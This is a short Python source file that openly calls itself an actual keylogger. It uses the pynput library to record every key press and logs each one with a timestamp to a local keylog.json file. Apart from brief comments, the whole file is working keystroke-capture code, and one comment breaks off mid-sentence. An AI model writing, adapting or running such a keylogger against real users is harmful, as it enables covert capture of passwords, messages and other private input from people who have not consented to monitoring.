
# WARNING
# THIS IS AN ACTUAL KEYLOGGER
# This file is aimed specifically for windowns systems, but when ran ON PURPOSE, will work on any system
from pynput.keyboard import Key, Listener # import Key is for special keys/characters
                                          # import Listener is for recording key strokes
import logging # Designed for 

logging.basicConfig(filename=("KeyLoggerProject/keylog.json"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()